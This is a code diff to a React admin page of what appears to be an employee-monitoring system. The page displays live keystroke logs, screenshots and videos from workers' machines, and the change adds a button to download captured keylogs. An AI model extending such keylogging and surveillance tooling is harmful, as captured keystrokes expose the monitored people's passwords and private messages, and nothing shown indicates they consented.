@@ -1,7 +1,7 @@
 import { useEffect, useState, useRef } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
 import { supabase } from '../lib/supabase';
-import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Settings, Wifi, WifiOff, MonitorPlay, MousePointer2, Camera, RefreshCw } from 'lucide-react';
+import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Settings, Wifi, WifiOff, MonitorPlay, MousePointer2, Camera, RefreshCw, Download } from 'lucide-react';
 
 export default function EmployeeDetail() {
     const { id } = useParams();
@@ -36,20 +36,27 @@ export default function EmployeeDetail() {
                 payload => { setScreenshots(prev => [resolveUrl(payload.new, 'screenshots'), ...prev]); setRequestingScreenshot(false); })
             .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'videos', filter: `employee_id=eq.${id}` },
                 payload => { setVideos(prev => [resolveUrl(payload.new, 'videos'), ...prev]); setRequestingVideo(false); })
+            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'employees', filter: `id=eq.${id}` },
+                payload => {
+                    setEmployee(payload.new);
+                    setIsOnline((new Date() - new Date(payload.new.last_seen)) / 1000 < 60);
+                })
             .subscribe();
 
-        const interval = setInterval(() => {
-            if (employee?.last_seen) {
-                setIsOnline((new Date() - new Date(employee.last_seen)) / 1000 < 60);
+        // Periodic refresh of employee status
+        const statusInterval = setInterval(async () => {
+            const { data } = await supabase.from('employees').select('last_seen').eq('id', id).single();
+            if (data) {
+                setIsOnline((new Date() - new Date(data.last_seen)) / 1000 < 60);
             }
-        }, 5000);
+        }, 10000);
 
         return () => {
             supabase.removeChannel(sub);
-            clearInterval(interval);
+            clearInterval(statusInterval);
             stopStream();
         }
-    }, [id, employee?.last_seen]);
+    }, [id]);
 
     const resolveUrl = (item, bucket) => ({ ...item, publicUrl: item.url.startsWith('http') ? item.url : supabase.storage.from(bucket).getPublicUrl(item.storage_path).data.publicUrl });
 
@@ -223,7 +230,25 @@ export default function EmployeeDetail() {
 
                     {/* Keylogs */}
                     <div className="bg-white p-4 rounded-xl shadow-sm border flex-1 flex flex-col min-h-0">
-                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-2"><Keyboard className="w-4 h-4" /> Teclas en Vivo</h3>
+                        <div className="flex items-center justify-between mb-2">
+                            <h3 className="font-semibold text-gray-700 flex items-center gap-2"><Keyboard className="w-4 h-4" /> Teclas en Vivo</h3>
+                            <button
+                                onClick={() => {
+                                    const text = keylogs.map(l => `[${new Date(l.captured_at).toLocaleString()}]\n${l.content}`).join('\n\n');
+                                    const blob = new Blob([text], { type: 'text/plain' });
+                                    const url = URL.createObjectURL(blob);
+                                    const a = document.createElement('a');
+                                    a.href = url;
+                                    a.download = `keylogs_${employee.hostname}_${Date.now()}.txt`;
+                                    a.click();
+                                    URL.revokeObjectURL(url);
+                                }}
+                                className="text-gray-500 hover:text-blue-600 p-1 rounded hover:bg-gray-100 transition"
+                                title="Descargar Keylogs"
+                            >
+                                <Download className="w-4 h-4" />
+                            </button>
+                        </div>
                         <div className="bg-gray-50 p-3 rounded-lg flex-1 overflow-y-auto font-mono text-xs space-y-2">
                             {keylogs.map(log => (
                                 <div key={log.id} className="border-b border-gray-200 pb-1">
